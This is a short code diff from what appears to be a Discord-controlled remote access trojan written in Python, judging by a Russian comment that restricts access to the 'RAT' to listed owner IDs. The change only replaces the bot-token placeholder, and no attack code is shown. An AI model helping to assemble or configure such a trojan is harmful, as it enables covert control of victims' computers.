@@ -19,7 +19,7 @@ import ctypes
 from asyncio import sleep
 owners = [айди людей которые будут иметь доступ к ратнukу]
 userid=getuser()+str(random.randint(123, 321))
-token = 'токен бота'
+token = '%TOKEN_HERE%'
 bot = commands.Bot(intents = discord.Intents.all(), command_prefix='cb.')
 bot.remove_command('help')
 if os.name == "nt":
